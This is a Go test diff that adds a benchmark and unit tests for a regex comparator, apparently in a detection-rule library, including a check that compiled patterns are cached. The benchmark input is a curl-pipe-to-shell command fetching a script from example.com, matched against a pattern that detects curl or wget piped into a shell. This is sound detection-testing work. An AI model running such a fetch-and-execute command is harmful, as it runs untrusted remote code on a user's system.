@@ -94,3 +94,54 @@ func BenchmarkContainsCS(b *testing.B) {
 		}
 	}
 }
+
+func BenchmarkRe(b *testing.B) {
+	comparator, err := GetComparator("field", Comparators, "re")
+	if err != nil {
+		b.Fatal(err)
+	}
+	b.ResetTimer()
+	for i := 0; i < b.N; i++ {
+		_, err := comparator(`/usr/bin/curl -s http://example.com/install.sh | sh`, `(?i)(curl|wget)\s+.*\|\s*(ba)?sh`)
+		if err != nil {
+			b.Fatal(err)
+		}
+	}
+}
+
+func Test_re(t *testing.T) {
+	tests := []struct {
+		actual   string
+		expected string
+		want     bool
+		wantErr  bool
+	}{
+		{"foo-bar-baz", "foo.*baz", true, false},
+		{"foo-bar-baz", "^bar", false, false},
+		{"FOO", "(?i)foo", true, false},
+		{"foo", "foo(", false, true},
+	}
+	for _, tt := range tests {
+		t.Run(tt.expected, func(t *testing.T) {
+			// run twice so that the second call uses the cached regex
+			for i := 0; i < 2; i++ {
+				got, err := re{}.Matches(tt.actual, tt.expected)
+				if (err != nil) != tt.wantErr {
+					t.Fatalf("re.Matches() error = %v, wantErr %v", err, tt.wantErr)
+				}
+				if got != tt.want {
+					t.Errorf("re.Matches() = %v, want %v", got, tt.want)
+				}
+			}
+		})
+	}
+
+	first, err := compileRegex("cached")
+	if err != nil {
+		t.Fatal(err)
+	}
+	second, _ := compileRegex("cached")
+	if first != second {
+		t.Error("expected compileRegex to return the cached *regexp.Regexp")
+	}
+}
